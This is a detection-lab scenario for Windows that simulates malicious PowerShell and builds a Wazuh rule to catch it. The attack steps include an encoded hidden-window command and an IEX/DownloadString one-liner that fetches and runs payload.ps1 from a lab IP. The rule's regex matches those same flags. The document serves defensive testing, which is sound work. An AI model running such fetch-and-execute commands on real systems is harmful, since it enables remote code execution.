# ✅ **06_malicious_powershell.md**

### **Scenario 06 — Malicious PowerShell Execution Detection**

---

# 📝 Overview

Simulates an attacker using encoded or obfuscated PowerShell to execute payloads or download malicious content.

---

# 🎯 Objective

* Detect encoded PowerShell
* Detect remote content execution
* Capture process lineage
* MITRE: **T1059.001 — PowerShell**

---

# ⚔️ Attack Steps (Windows)

### Encoded payload:

```powershell
powershell.exe -nop -w hidden -enc SQBFAFg...
```

### Download + execute:

```powershell
powershell -c "IEX(New-Object Net.WebClient).DownloadString('http://10.20.20.10/payload.ps1')"
```

---

# 🔍 Telemetry Collected

## **1. Sysmon Event ID 1 — Process Create**

```
Image: powershell.exe
CommandLine: -nop -enc SQB...
ParentImage: explorer.exe
```

## **2. Sysmon Event ID 3 — Network Connection**

```
DestinationIp: 10.20.20.10
DestinationPort: 80
```

---

# 🛡️ Wazuh Rule (Detect Encoded PowerShell)

```xml
<rule id="500001" level="12">
  <match>powershell.exe</match>
  <regex>-nop|-enc|DownloadString|IEX</regex>
  <description>Suspicious PowerShell Execution</description>
  <group>powershell,malicious,execution</group>
</rule>
```

---

# 🧠 MITRE Mapping

**T1059.001 – PowerShell**
**T1105 – Ingress Tool Transfer**

---

# 📊 Outcome

Validates:

* Script execution monitoring
* Network-based payload execution detection
* Correlation logic accuracy


